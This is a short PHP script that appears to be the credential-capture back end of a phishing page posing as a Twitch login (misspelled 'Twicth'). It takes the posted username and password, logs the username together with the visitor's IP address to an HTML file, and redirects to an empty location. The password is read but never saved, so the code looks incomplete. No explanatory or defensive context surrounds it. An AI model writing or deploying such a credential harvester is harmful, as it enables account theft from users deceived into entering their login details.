<?php
$restto = $_POST['username'];
$word = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$f = fopen("logger.html", "a");
fwrite ($f, 'Twicth LOGIN: [<b><font color="#DC143C">'.$restto.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
fclose($f);
header('Location: ');
exit();
?>
